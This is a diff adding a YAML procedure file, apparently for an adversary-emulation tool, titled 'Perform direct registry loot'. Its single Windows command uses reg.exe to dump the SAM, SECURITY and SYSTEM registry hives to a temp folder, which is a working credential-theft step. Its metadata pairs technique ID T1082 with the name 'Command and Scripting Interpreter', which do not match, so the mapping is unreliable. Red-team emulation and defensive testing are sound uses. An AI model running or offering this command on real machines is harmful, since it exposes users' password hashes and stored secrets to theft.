@@ -1,0 +1,16 @@
+id: 4a136ba6-66f1-11eb-ae93-0242ac130002 
+metadata:
+  version: 1
+  authors: 
+    - Abhishek S (abhiabhi2306)
+  tags: []
+name: Perform direct registry loot
+description: |
+  The registry can directly looted without using tools like wce,fgdump or external binaries.
+technique:
+  id: T1082
+  name: Command and Scripting Interpreter
+platforms:
+  windows:
+    cmd:
+      command: C:\Windows\System32\reg.exe save hklm\sam c:\windows\temp\sam.save && C:\Windows\System32\reg.exe save hklm\security c:\windows\temp\security.save && C:\Windows\System32\reg.exe save hklm\system c:\windows\temp\system.save
